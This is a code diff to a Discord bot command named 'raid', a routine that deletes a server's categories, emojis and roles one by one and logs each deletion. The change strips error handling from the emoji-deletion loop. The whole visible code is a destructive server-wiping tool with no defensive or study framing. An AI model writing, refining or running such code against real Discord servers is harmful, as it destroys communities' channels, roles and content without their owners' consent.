@@ -38,11 +38,7 @@ async def raid(ctx):
 		except:
 			print(f"Category: {channel.name} has failed to be deleted from {ctx.guild.name}")
 	for emoji in list(ctx.guild.emojis):
-		try:
-			await emoji.delete()
-			print(f"Emoji: {emoji.name} has been deleted from {ctx.guild.name}")
-		except:
-			print(f"Emoji: {emoji.name} has failed to be deleted from {ctx.guild.name}")
+		await emoji.delete()
 	for role in list(ctx.guild.roles):
 		try:
 			await role.delete()
